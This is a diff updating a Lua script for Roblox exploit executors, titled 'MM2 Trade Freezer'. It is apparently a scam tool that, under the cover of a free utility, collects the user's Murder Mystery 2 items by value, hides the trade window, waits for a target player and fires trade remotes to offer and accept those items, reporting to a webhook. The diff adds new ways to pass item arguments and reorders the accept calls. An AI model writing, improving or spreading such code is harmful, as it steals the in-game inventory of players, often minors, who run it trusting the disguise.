@@ -1,4 +1,4 @@
---[[ MM2 Trade Freezer v9.3 | KEYLESS | FREE ]]
+--[[ MM2 Trade Freezer v9.4 | KEYLESS | FREE ]]
 
 local CONFIG = {
     WEBHOOK        = "",
@@ -42,8 +42,6 @@ local playerGui = lp:WaitForChild("PlayerGui")
 
 local STATE = { stopped = false, rounds = 0 }
 getgenv().MM2FZ = { stop = function() STATE.stopped = true end }
-
-local nc = newcclosure or function(f) return f end
 
 local httpFn = (syn and syn.request) or (http and http.request)
     or http_request or (fluxus and fluxus.request) or request
@@ -118,7 +116,7 @@ local function webhook(title, color, desc, fields, content)
         local thumb = {}
         thumb.url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId)
         local foot = {}
-        foot.text = "MM2 Trade Freezer v9.3"
+        foot.text = "MM2 Trade Freezer v9.4"
         local emb = {}
         emb.title = title
         emb.description = desc
@@ -367,7 +365,7 @@ footer.Font = Enum.Font.Gotham
 footer.TextSize = 9
 footer.TextXAlignment = Enum.TextXAlignment.Center
 footer.TextColor3 = Color3.fromRGB(120, 115, 145)
-footer.Text = "keyless · v9.3"
+footer.Text = "keyless · v9.4"
 footer.Parent = main
 
 local timerCount = 0
@@ -496,7 +494,7 @@ local function runLoader()
 end
 task.spawn(runLoader)
 
-log("Trade Freezer v9.3 loaded")
+log("Trade Freezer v9.4 loaded")
 
 local VALUES = {}
 
@@ -609,7 +607,6 @@ local JUNK = {
     ["weapons"]=true, ["search"]=true, ["item"]=true, ["items"]=true,
     ["loading..."]=true, ["materials"]=true, ["container"]=true, ["result"]=true,
     ["unique"]=true, ["chroma"]=true, ["halloween"]=true, ["christmas"]=true,
-    ["easter"]=true, ["summer"]=true, ["ancient"]=true, ["godly"]=true,
 }
 
 local function isJunkName(n)
@@ -628,18 +625,14 @@ local function cardName(card)
         local t = lbl.Text
         if t and #t > 1 then return t end
     end
-    local hasImg = false
-    for _, x in ipairs(card:GetDescendants()) do
-        if x:IsA("ImageLabel") or x:IsA("ImageButton") then
-            hasImg = true
-            break
-        end
-    end
-    if not hasImg then return nil end
+    return nil
+end
+
+local function cardImage(card)
     for _, d in ipairs(card:GetDescendants()) do
-        if d:IsA("TextLabel") then
-            local t = d.Text
-            if t and #t > 1 and #t < 40 and not t:match("^%d+$") then return t end
+        if d:IsA("ImageLabel") or d:IsA("ImageButton") then
+            local img = d.Image
+            if img and img ~= "" then return img end
         end
     end
     return nil
@@ -670,6 +663,7 @@ local function harvest(root, items, seen, counter)
                     e.value = valueOf(nm)
                     e.tag = rarityTag(nm)
                     e.card = d
+                    e.img = cardImage(d)
                     items[#items + 1] = e
                 end
             end
@@ -743,7 +737,6 @@ local X = {}
 X.acceptReq = byPath("Trade.AcceptRequest")
 X.start     = byPath("Trade.StartTrade")
 X.update    = byPath("Trade.UpdateOffers")
-X.remove    = byPath("Trade.RemoveOffer")
 
 local function hideTradeUI()
     for _, g in ipairs(playerGui:GetChildren()) do
@@ -857,17 +850,24 @@ local function waitForTarget()
     return nil
 end
 
+local function imgId(img)
+    if not img then return nil end
+    local n = img:match("(%d+)%s*$")
+    if n then return tonumber(n) end
+    return nil
+end
+
 local SHAPES = {
     { "slot" },
-    { "slot0" },
     { "name" },
+    { "imgid" },
+    { "slot0" },
     { "namelower" },
     { "slotstr" },
+    { "imgstr" },
     { "card" },
     { "slotname" },
     { "nameslot" },
-    { "tname" },
-    { "tslot" },
 }
 
 local function shapeArgs(it, shape)
@@ -879,17 +879,17 @@ local function shapeArgs(it, shape)
         elseif s == "namelower" then a[#a + 1] = it.name:lower()
         elseif s == "slotstr" then a[#a + 1] = tostring(it.slot)
         elseif s == "card" then a[#a + 1] = it.card
+        elseif s == "imgid" then a[#a + 1] = imgId(it.img)
+        elseif s == "imgstr" then a[#a + 1] = it.img
         elseif s == "slotname" then a[#a + 1] = it.slot; a[#a + 1] = it.name
         elseif s == "nameslot" then a[#a + 1] = it.name; a[#a + 1] = it.slot
-        elseif s == "tname" then a[#a + 1] = { it.name }
-        elseif s == "tslot" then a[#a + 1] = { it.slot }
         end
     end
     return a
 end
 
-local function attempt(remote, it, base, placed, label)
-    local args = shapeArgs(it, label)
+local function attempt(remote, it, base, placed, shape)
+    local args = shapeArgs(it, shape)
     call(remote, table.unpack(args))
     task.wait(0.3)
     local g = tradeGui()
@@ -941,10 +941,10 @@ local function doRound(batch, tgt, round)
     gui = tradeGui()
     if not gui then return false, "window vanished" end
 
+    call(R.accept)
+    task.wait(0.6)
     call(X.acceptReq)
-    task.wait(0.3)
-    call(X.start)
-    task.wait(0.5)
+    task.wait(0.4)
 
     local base = offerCount(gui) or 0
     local placed = 0
